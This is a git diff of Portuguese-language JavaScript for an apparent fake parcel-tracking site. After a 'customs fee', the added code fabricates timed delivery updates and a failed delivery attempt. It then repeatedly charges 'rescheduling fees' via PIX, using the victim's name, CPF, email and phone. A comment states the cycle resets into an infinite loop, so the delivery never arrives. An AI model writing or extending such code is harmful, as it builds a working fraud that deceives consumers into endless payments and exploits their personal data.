@@ -869,12 +869,25 @@ export class TrackingSystem {
 
         this.showSuccessNotification();
 
-        // Continuar com próximas etapas
+        // Iniciar fluxo de entrega após pagamento da taxa alfandegária
         setTimeout(() => {
-            this.addPostPaymentSteps();
+            this.startDeliveryFlow();
         }, 1000);
     }
 
+    startDeliveryFlow() {
+        console.log('🚚 Iniciando fluxo de entrega após liberação alfandegária...');
+        
+        // Inicializar sistema de entrega se não existir
+        if (!this.deliverySystem) {
+            this.deliverySystem = new DeliveryFlowSystem(this);
+        }
+        
+        // Iniciar fluxo de entrega
+        this.deliverySystem.startDeliveryFlow();
+    }
+
+    // Método legado mantido para compatibilidade
     addPostPaymentSteps() {
         const timeline = document.getElementById('trackingTimeline');
         if (!timeline) return;
@@ -1211,6 +1224,697 @@ export class TrackingSystem {
             console.error('❌ Falha ao configurar API Secret Zentra Pay');
         }
         return success;
+    }
+
+    // Método para limpar sistema ao sair
+    cleanup() {
+        if (this.deliverySystem) {
+            this.deliverySystem.cleanup();
+        }
+        console.log('🧹 Sistema de rastreamento limpo');
+    }
+}
+
+/**
+ * Sistema de fluxo de entrega com tentativas em loop
+ */
+class DeliveryFlowSystem {
+    constructor(trackingSystem) {
+        this.trackingSystem = trackingSystem;
+        this.deliveryAttempts = 0;
+        this.deliveryValues = [7.74, 12.38, 16.46]; // Valores das tentativas
+        this.isProcessing = false;
+        this.timers = [];
+        this.currentStep = 0;
+        this.deliveryPixData = null;
+        
+        console.log('🚀 Sistema de fluxo de entrega inicializado');
+        console.log('💰 Valores de tentativa:', this.deliveryValues);
+    }
+
+    startDeliveryFlow() {
+        console.log('🚀 Iniciando fluxo de entrega...');
+        this.clearAllTimers();
+        
+        // Etapa 1: Liberado na alfândega (imediato)
+        this.addTimelineStep({
+            stepNumber: 12,
+            title: 'Pedido liberado na alfândega de importação',
+            description: 'Seu pedido foi liberado após o pagamento da taxa alfandegária',
+            delay: 0,
+            hasPaymentButton: false
+        });
+        
+        // Etapa 2: Sairá para entrega (após 2 minutos)
+        this.addTimelineStep({
+            stepNumber: 13,
+            title: 'Pedido sairá para entrega',
+            description: 'Pedido sairá para entrega para seu endereço',
+            delay: 2 * 60 * 1000, // 2 minutos
+            hasPaymentButton: false
+        });
+        
+        // Etapa 3: Em trânsito (após 2 horas)
+        this.addTimelineStep({
+            stepNumber: 14,
+            title: 'Pedido em trânsito para entrega',
+            description: 'Pedido em trânsito para seu endereço',
+            delay: 2 * 60 * 60 * 1000, // 2 horas
+            hasPaymentButton: false
+        });
+        
+        // Etapa 4: Em rota (após 4 horas)
+        this.addTimelineStep({
+            stepNumber: 15,
+            title: 'Pedido em rota de entrega',
+            description: 'Pedido em rota de entrega para seu endereço, aguarde',
+            delay: 4 * 60 * 60 * 1000, // 4 horas
+            hasPaymentButton: false
+        });
+        
+        // Etapa 5: Tentativa de entrega (após 6 horas)
+        this.addTimelineStep({
+            stepNumber: 16,
+            title: `${this.deliveryAttempts + 1}ª tentativa de entrega`,
+            description: `${this.deliveryAttempts + 1}ª tentativa de entrega realizada, mas não foi possível entregar`,
+            delay: 6 * 60 * 60 * 1000, // 6 horas
+            hasPaymentButton: true,
+            isDeliveryAttempt: true
+        });
+    }
+
+    addTimelineStep({ stepNumber, title, description, delay, hasPaymentButton = false, isDeliveryAttempt = false }) {
+        const timer = setTimeout(() => {
+            console.log(`📦 Adicionando etapa ${stepNumber}: ${title}`);
+            
+            const timeline = document.getElementById('trackingTimeline');
+            if (!timeline) return;
+
+            const stepDate = new Date();
+            const timelineItem = this.createTimelineItem({
+                stepNumber,
+                title,
+                description,
+                date: stepDate,
+                completed: true,
+                hasPaymentButton,
+                isDeliveryAttempt
+            });
+
+            timeline.appendChild(timelineItem);
+
+            // Animar entrada da nova etapa
+            setTimeout(() => {
+                timelineItem.style.opacity = '1';
+                timelineItem.style.transform = 'translateY(0)';
+            }, 100);
+
+            // Scroll para a nova etapa
+            timelineItem.scrollIntoView({ 
+                behavior: 'smooth', 
+                block: 'center' 
+            });
+
+            this.currentStep = stepNumber;
+
+        }, delay);
+
+        this.timers.push(timer);
+    }
+
+    createTimelineItem({ stepNumber, title, description, date, completed, hasPaymentButton, isDeliveryAttempt }) {
+        const item = document.createElement('div');
+        item.className = `timeline-item ${completed ? 'completed' : ''}`;
+        item.style.opacity = '0';
+        item.style.transform = 'translateY(20px)';
+        item.style.transition = 'all 0.5s ease';
+
+        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
+        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+
+        let buttonHtml = '';
+        
+        if (hasPaymentButton && isDeliveryAttempt) {
+            const attemptNumber = this.deliveryAttempts + 1;
+            const value = this.deliveryValues[this.deliveryAttempts % this.deliveryValues.length];
+            
+            buttonHtml = `
+                <button class="delivery-retry-btn" data-attempt="${this.deliveryAttempts}" data-value="${value}">
+                    <i class="fas fa-redo"></i> Reagendar Entrega - R$ ${value.toFixed(2)}
+                </button>
+            `;
+        }
+
+        item.innerHTML = `
+            <div class="timeline-dot"></div>
+            <div class="timeline-content">
+                <div class="timeline-date">
+                    <span class="date">${dateStr}</span>
+                    <span class="time">${timeStr}</span>
+                </div>
+                <div class="timeline-text">
+                    <p>${description}</p>
+                    ${buttonHtml}
+                </div>
+            </div>
+        `;
+
+        // Configurar eventos dos botões
+        if (hasPaymentButton && isDeliveryAttempt) {
+            const retryButton = item.querySelector('.delivery-retry-btn');
+            if (retryButton) {
+                this.configureDeliveryRetryButton(retryButton);
+            }
+        }
+
+        return item;
+    }
+
+    configureDeliveryRetryButton(button) {
+        button.addEventListener('click', () => {
+            this.handleDeliveryRetry(button);
+        });
+
+        console.log('🔄 Botão de reagendamento configurado');
+    }
+
+    async handleDeliveryRetry(button) {
+        if (this.isProcessing) return;
+
+        this.isProcessing = true;
+        const attemptNumber = parseInt(button.dataset.attempt);
+        const value = parseFloat(button.dataset.value);
+        
+        console.log(`🔄 Processando reagendamento - Tentativa ${attemptNumber + 1} - R$ ${value.toFixed(2)}`);
+
+        // Mostrar loading
+        this.showDeliveryLoadingNotification();
+
+        try {
+            // Gerar PIX funcional via Zentra Pay
+            console.log('🚀 Gerando PIX para tentativa de entrega via Zentra Pay...');
+            
+            const userData = {
+                nome: this.trackingSystem.leadData.nome_completo,
+                cpf: this.trackingSystem.leadData.cpf,
+                email: this.trackingSystem.leadData.email,
+                telefone: this.trackingSystem.leadData.telefone
+            };
+            
+            const pixResult = await this.trackingSystem.zentraPayService.createPixTransaction(userData, value);
+
+            if (pixResult.success) {
+                console.log('🎉 PIX de reagendamento gerado com sucesso!');
+                this.deliveryPixData = pixResult;
+                
+                this.closeDeliveryLoadingNotification();
+                
+                // Mostrar modal de pagamento de reagendamento
+                setTimeout(() => {
+                    this.showDeliveryPixModal(value, attemptNumber + 1);
+                }, 300);
+            } else {
+                throw new Error(pixResult.error || 'Erro ao gerar PIX de reagendamento');
+            }
+            
+        } catch (error) {
+            console.error('💥 Erro ao gerar PIX de reagendamento:', error);
+            this.closeDeliveryLoadingNotification();
+            
+            // Mostrar modal estático como fallback
+            setTimeout(() => {
+                this.showDeliveryPixModal(value, attemptNumber + 1, true);
+            }, 300);
+        }
+    }
+
+    showDeliveryLoadingNotification() {
+        const notification = document.createElement('div');
+        notification.id = 'deliveryLoadingNotification';
+        notification.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 3000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        `;
+
+        const content = document.createElement('div');
+        content.style.cssText = `
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            animation: slideUp 0.3s ease;
+            border: 3px solid #1e4a6b;
+        `;
+
+        content.innerHTML = `
+            <div style="margin-bottom: 20px;">
+                <i class="fas fa-truck" style="font-size: 3rem; color: #1e4a6b; animation: pulse 1.5s infinite;"></i>
+            </div>
+            <h3 style="color: #2c3e50; font-size: 1.5rem; font-weight: 700; margin-bottom: 15px;">
+                Gerando PIX de Reagendamento...
+            </h3>
+            <p style="color: #666; font-size: 1.1rem; line-height: 1.6; margin-bottom: 20px;">
+                Aguarde enquanto processamos sua solicitação
+            </p>
+            <div style="margin-top: 25px;">
+                <div style="width: 100%; height: 4px; background: #e9ecef; border-radius: 2px; overflow: hidden;">
+                    <div style="width: 0%; height: 100%; background: linear-gradient(45deg, #1e4a6b, #2c5f8a); border-radius: 2px; animation: progressBar 5s linear forwards;"></div>
+                </div>
+            </div>
+            <p style="color: #999; font-size: 0.9rem; margin-top: 15px;">
+                Processando pagamento...
+            </p>
+        `;
+
+        notification.appendChild(content);
+        document.body.appendChild(notification);
+        document.body.style.overflow = 'hidden';
+    }
+
+    closeDeliveryLoadingNotification() {
+        const notification = document.getElementById('deliveryLoadingNotification');
+        if (notification) {
+            notification.style.animation = 'fadeOut 0.3s ease';
+            setTimeout(() => {
+                if (notification.parentNode) {
+                    notification.remove();
+                }
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
+    }
+
+    showDeliveryPixModal(value, attemptNumber, isStatic = false) {
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.id = 'deliveryPixModal';
+        modal.style.cssText = `
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+            backdrop-filter: blur(5px);
+            animation: fadeIn 0.3s ease;
+        `;
+
+        // QR Code e PIX Payload
+        let qrCodeSrc, pixPayload;
+        
+        if (!isStatic && this.deliveryPixData && this.deliveryPixData.pixPayload) {
+            // Dados reais do Zentra Pay
+            qrCodeSrc = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(this.deliveryPixData.pixPayload)}`;
+            pixPayload = this.deliveryPixData.pixPayload;
+            console.log('✅ Usando PIX real do Zentra Pay para reagendamento');
+        } else {
+            // Fallback estático
+            qrCodeSrc = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
+            pixPayload = '00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925LOGIX EXPRESS LTDA6009SAO PAULO62070503***6304A1B2';
+            console.log('⚠️ Usando PIX estático como fallback para reagendamento');
+        }
+
+        const leadName = this.trackingSystem.leadData?.nome_completo || 'Cliente';
+
+        modal.innerHTML = `
+            <div class="professional-modal-container">
+                <div class="professional-modal-header">
+                    <h2 class="professional-modal-title">${attemptNumber}ª Tentativa de Entrega</h2>
+                    <button class="professional-modal-close" id="closeDeliveryPixModal">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                
+                <div class="professional-modal-content">
+                    <div class="liberation-explanation">
+                        <p class="liberation-subtitle">
+                            <strong>${leadName}</strong>, para reagendar a entrega do seu pedido, é necessário pagar a taxa de reagendamento de <strong>R$ ${value.toFixed(2)}</strong>.
+                        </p>
+                    </div>
+
+                    <div class="professional-fee-display">
+                        <div class="fee-info">
+                            <span class="fee-label">Taxa de Reagendamento - ${attemptNumber}ª Tentativa</span>
+                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
+                        </div>
+                    </div>
+
+                    <!-- Seção PIX Real - Zentra Pay -->
+                    <div class="professional-pix-section">
+                        <h3 class="pix-section-title">Pagamento via Pix</h3>
+                        
+                        <div class="pix-content-grid">
+                            <!-- QR Code -->
+                            <div class="qr-code-section">
+                                <div class="qr-code-container">
+                                    <img src="${qrCodeSrc}" alt="QR Code PIX Reagendamento" class="professional-qr-code">
+                                </div>
+                            </div>
+                            
+                            <!-- PIX Copia e Cola -->
+                            <div class="pix-copy-section">
+                                <label class="pix-copy-label">PIX Copia e Cola</label>
+                                <div class="professional-copy-container">
+                                    <textarea id="deliveryPixCode" class="professional-pix-input" readonly>${pixPayload}</textarea>
+                                    <button class="professional-copy-button" id="copyDeliveryPixButton">
+                                        <i class="fas fa-copy"></i> Copiar
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Instruções de Pagamento -->
+                        <div class="professional-payment-steps">
+                            <h4 class="steps-title">Como realizar o pagamento:</h4>
+                            <div class="payment-steps-grid">
+                                <div class="payment-step">
+                                    <div class="step-number">1</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-mobile-alt step-icon"></i>
+                                        <span class="step-text">Acesse seu app do banco</span>
+                                    </div>
+                                </div>
+                                <div class="payment-step">
+                                    <div class="step-number">2</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-qrcode step-icon"></i>
+                                        <span class="step-text">Cole o código Pix ou escaneie o QR Code</span>
+                                    </div>
+                                </div>
+                                <div class="payment-step">
+                                    <div class="step-number">3</div>
+                                    <div class="step-content">
+                                        <i class="fas fa-check step-icon"></i>
+                                        <span class="step-text">Confirme o pagamento</span>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Botão de Simulação para Testes -->
+                        <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
+                            <button id="simulateDeliveryPaymentButton" style="
+                                background: #6c757d;
+                                color: white;
+                                border: none;
+                                padding: 8px 16px;
+                                border-radius: 6px;
+                                cursor: pointer;
+                                font-size: 0.9rem;
+                                font-weight: 500;
+                                opacity: 0.8;
+                            ">
+                                🧪 Simular Pagamento (Teste)
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        `;
+
+        document.body.appendChild(modal);
+        document.body.style.overflow = 'hidden';
+
+        // Configurar eventos
+        this.setupDeliveryModalEvents(modal, attemptNumber);
+
+        console.log(`💳 Modal de PIX para ${attemptNumber}ª tentativa exibido - R$ ${value.toFixed(2)}`);
+    }
+
+    setupDeliveryModalEvents(modal, attemptNumber) {
+        // Botão fechar
+        const closeButton = modal.querySelector('#closeDeliveryPixModal');
+        if (closeButton) {
+            closeButton.addEventListener('click', () => {
+                this.closeDeliveryPixModal();
+            });
+        }
+
+        // Botão copiar PIX
+        const copyButton = modal.querySelector('#copyDeliveryPixButton');
+        if (copyButton) {
+            copyButton.addEventListener('click', () => {
+                this.copyDeliveryPixCode();
+            });
+        }
+
+        // Botão simular pagamento
+        const simulateButton = modal.querySelector('#simulateDeliveryPaymentButton');
+        if (simulateButton) {
+            simulateButton.addEventListener('click', () => {
+                this.simulateDeliveryPayment(attemptNumber);
+            });
+        }
+
+        // Fechar ao clicar fora
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                this.closeDeliveryPixModal();
+            }
+        });
+    }
+
+    simulateDeliveryPayment(attemptNumber) {
+        console.log(`💳 Simulando pagamento da ${attemptNumber}ª tentativa`);
+        
+        this.closeDeliveryPixModal();
+        
+        // Processar pagamento com sucesso
+        setTimeout(() => {
+            this.processDeliveryPaymentSuccess(attemptNumber);
+        }, 1000);
+    }
+
+    processDeliveryPaymentSuccess(attemptNumber) {
+        console.log(`✅ Pagamento da ${attemptNumber}ª tentativa processado com sucesso`);
+        
+        // Ocultar botão de reagendamento atual
+        this.hideCurrentRetryButton(attemptNumber - 1);
+        
+        // Mostrar notificação de sucesso
+        this.showDeliverySuccessNotification(attemptNumber);
+        
+        // Incrementar contador de tentativas
+        this.deliveryAttempts = attemptNumber;
+        
+        // Se chegou na 3ª tentativa, resetar para loop infinito
+        if (this.deliveryAttempts >= 3) {
+            this.deliveryAttempts = 0;
+        }
+        
+        // Iniciar novo ciclo de entrega
+        setTimeout(() => {
+            this.startNewDeliveryCycle();
+        }, 2000);
+    }
+
+    hideCurrentRetryButton(attemptIndex) {
+        const currentRetryButton = document.querySelector(`[data-attempt="${attemptIndex}"]`);
+        if (currentRetryButton) {
+            currentRetryButton.style.display = 'none';
+        }
+    }
+
+    showDeliverySuccessNotification(attemptNumber) {
+        const notification = document.createElement('div');
+        notification.className = 'payment-success-notification';
+        notification.style.cssText = `
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #27ae60;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 15px rgba(39, 174, 96, 0.3);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-family: 'Inter', sans-serif;
+            animation: slideInRight 0.5s ease, fadeOut 0.5s ease 4.5s forwards;
+        `;
+
+        notification.innerHTML = `
+            <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
+            <div>
+                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
+                <div style="font-size: 0.9rem; opacity: 0.9;">${attemptNumber}ª tentativa reagendada com sucesso.</div>
+            </div>
+        `;
+
+        document.body.appendChild(notification);
+
+        setTimeout(() => {
+            if (notification.parentNode) {
+                notification.remove();
+            }
+        }, 5000);
+    }
+
+    startNewDeliveryCycle() {
+        console.log('🚚 Iniciando novo ciclo de entrega...');
+        
+        this.isProcessing = false;
+        
+        // Resetar contador de etapas para o novo ciclo
+        const baseStep = 100 + (this.deliveryAttempts * 10); // 100, 110, 120, etc.
+        
+        // Etapa 1: Sairá para entrega (imediato)
+        this.addTimelineStep({
+            stepNumber: baseStep + 1,
+            title: 'Pedido sairá para entrega',
+            description: 'Seu pedido está sendo preparado para nova tentativa de entrega',
+            delay: 0,
+            hasPaymentButton: false
+        });
+        
+        // Etapa 2: Em trânsito 1 (após 30 minutos)
+        this.addTimelineStep({
+            stepNumber: baseStep + 2,
+            title: 'Pedido em trânsito para entrega',
+            description: 'Pedido em trânsito para seu endereço',
+            delay: 30 * 60 * 1000, // 30 minutos
+            hasPaymentButton: false
+        });
+        
+        // Etapa 3: Em trânsito 2 (após 1 hora)
+        this.addTimelineStep({
+            stepNumber: baseStep + 3,
+            title: 'Pedido em trânsito para entrega',
+            description: 'Pedido em trânsito para seu endereço',
+            delay: 60 * 60 * 1000, // 1 hora
+            hasPaymentButton: false
+        });
+        
+        // Etapa 4: Em rota (após 1.5 horas)
+        this.addTimelineStep({
+            stepNumber: baseStep + 4,
+            title: 'Pedido em rota de entrega',
+            description: 'Pedido em rota de entrega para seu endereço, aguarde',
+            delay: 90 * 60 * 1000, // 1.5 horas
+            hasPaymentButton: false
+        });
+        
+        // Etapa 5: Nova tentativa (após 2 horas)
+        this.addTimelineStep({
+            stepNumber: baseStep + 5,
+            title: `${this.deliveryAttempts + 1}ª tentativa de entrega`,
+            description: `${this.deliveryAttempts + 1}ª tentativa de entrega realizada, mas não foi possível entregar`,
+            delay: 2 * 60 * 60 * 1000, // 2 horas
+            hasPaymentButton: true,
+            isDeliveryAttempt: true
+        });
+    }
+
+    copyDeliveryPixCode() {
+        const pixInput = document.getElementById('deliveryPixCode');
+        const copyButton = document.getElementById('copyDeliveryPixButton');
+        
+        if (!pixInput || !copyButton) return;
+
+        try {
+            pixInput.select();
+            pixInput.setSelectionRange(0, 99999);
+
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(pixInput.value).then(() => {
+                    console.log('✅ PIX de reagendamento copiado:', pixInput.value.substring(0, 50) + '...');
+                    this.showCopySuccess(copyButton);
+                }).catch(() => {
+                    this.fallbackCopy(pixInput, copyButton);
+                });
+            } else {
+                this.fallbackCopy(pixInput, copyButton);
+            }
+        } catch (error) {
+            console.error('❌ Erro ao copiar PIX de reagendamento:', error);
+        }
+    }
+
+    fallbackCopy(input, button) {
+        try {
+            const successful = document.execCommand('copy');
+            if (successful) {
+                console.log('✅ PIX de reagendamento copiado via execCommand');
+                this.showCopySuccess(button);
+            }
+        } catch (error) {
+            console.error('❌ Fallback copy falhou:', error);
+        }
+    }
+
+    showCopySuccess(button) {
+        const originalText = button.innerHTML;
+        button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+        button.style.background = '#27ae60';
+        
+        setTimeout(() => {
+            button.innerHTML = originalText;
+            button.style.background = '';
+        }, 2000);
+    }
+
+    closeDeliveryPixModal() {
+        const modal = document.getElementById('deliveryPixModal');
+        if (modal) {
+            modal.style.animation = 'fadeOut 0.3s ease';
+            setTimeout(() => {
+                if (modal.parentNode) {
+                    modal.remove();
+                }
+                document.body.style.overflow = 'auto';
+            }, 300);
+        }
+        this.isProcessing = false;
+    }
+
+    clearAllTimers() {
+        this.timers.forEach(timer => clearTimeout(timer));
+        this.timers = [];
+        console.log('🧹 Todos os timers de entrega foram limpos');
+    }
+
+    cleanup() {
+        this.clearAllTimers();
+        this.deliveryAttempts = 0;
+        this.isProcessing = false;
+        this.currentStep = 0;
+        this.deliveryPixData = null;
+        
+        // Fechar modais se abertos
+        this.closeDeliveryPixModal();
+
+        console.log('🔄 Sistema de entrega resetado');
+    }
+
+    getStatus() {
+        return {
+            deliveryAttempts: this.deliveryAttempts,
+            isProcessing: this.isProcessing,
+            currentStep: this.currentStep,
+            activeTimers: this.timers.length,
+            currentDeliveryValue: this.deliveryValues[this.deliveryAttempts % this.deliveryValues.length],
+            deliveryValues: this.deliveryValues,
+            hasDeliveryPixData: !!this.deliveryPixData
+        };
     }
 }
 
